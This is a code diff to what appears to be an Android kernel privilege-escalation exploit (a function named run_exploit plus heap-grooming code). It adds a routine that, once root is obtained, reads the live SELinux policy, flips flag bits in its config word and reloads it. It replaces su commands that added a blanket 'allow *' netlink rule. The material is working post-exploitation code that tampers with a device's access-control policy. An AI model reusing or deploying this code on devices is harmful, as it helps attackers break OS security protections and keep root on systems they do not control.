@@ -261,6 +261,44 @@ static int check_selinux_off(void) {
   return b[0] == '0';
 }
 
+static void fix_selinux_policy(void) {
+  int rfd = open("/sys/fs/selinux/policy", O_RDONLY);
+  if (rfd < 0) { pr_info("fix_policy: open read failed errno=%d\n", errno); return; }
+  off_t sz = lseek(rfd, 0, SEEK_END);
+  if (sz <= 0) { close(rfd); return; }
+  lseek(rfd, 0, SEEK_SET);
+  uint8_t *buf = malloc(sz);
+  if (!buf) { close(rfd); return; }
+  ssize_t rd = read(rfd, buf, sz);
+  close(rfd);
+  if (rd != sz) { free(buf); return; }
+
+  if (sz < 20 || buf[0] != 0x8c || buf[1] != 0xff || buf[2] != 0x7c || buf[3] != 0xf9) {
+    pr_info("fix_policy: bad magic\n");
+    free(buf); return;
+  }
+
+  uint32_t id_len;
+  memcpy(&id_len, buf + 4, 4);
+  size_t config_off = 4 + 4 + id_len + 4;
+  if (config_off + 4 > (size_t)sz) { free(buf); return; }
+
+  uint32_t config;
+  memcpy(&config, buf + config_off, 4);
+  uint32_t fixed = config | 0xC0000000U;
+  if (fixed != config) {
+    memcpy(buf + config_off, &fixed, 4);
+    pr_info("fix_policy: config 0x%08x -> 0x%08x (offset 0x%zx)\n", config, fixed, config_off);
+  }
+
+  int wfd = open("/sys/fs/selinux/load", O_WRONLY);
+  if (wfd < 0) { pr_info("fix_policy: open load failed errno=%d\n", errno); free(buf); return; }
+  ssize_t wr = write(wfd, buf, sz);
+  close(wfd);
+  free(buf);
+  pr_info("fix_policy: load %s (%zd/%zd bytes)\n", wr == sz ? "ok" : "FAILED", wr, (ssize_t)sz);
+}
+
 static void slab_drain(void) {
   struct timespec up;
   clock_gettime(CLOCK_BOOTTIME, &up);
@@ -498,8 +536,7 @@ int run_exploit(int argc, char **argv) {
     for (int i = 0; i < 60; i++) {
       if (system("su -c 'id' > /dev/null 2>&1") == 0) {
         pr_success("su ready, fixing SELinux policy\n");
-        system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
-        system("su -c '/data/adb/ksu/bin/ksud sepolicy patch \"allow * netlink_route_socket { nlmsg_getlink nlmsg_read create bind getopt setopt }\"' > /dev/null 2>&1");
+        fix_selinux_policy();
         system("su -c 'setenforce 1' > /dev/null 2>&1");
         pr_success("sepolicy fix done\n");
         break;
@@ -571,8 +608,7 @@ int run_exploit(int argc, char **argv) {
   for (int i = 0; i < 60; i++) {
     if (system("su -c 'id' > /dev/null 2>&1") == 0) {
       pr_success("su ready, fixing SELinux policy\n");
-      system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
-      system("su -c '/data/adb/ksu/bin/ksud sepolicy patch \"allow * netlink_route_socket { nlmsg_getlink nlmsg_read create bind getopt setopt }\"' > /dev/null 2>&1");
+      fix_selinux_policy();
       system("su -c 'setenforce 1' > /dev/null 2>&1");
       pr_success("sepolicy fix done\n");
       break;
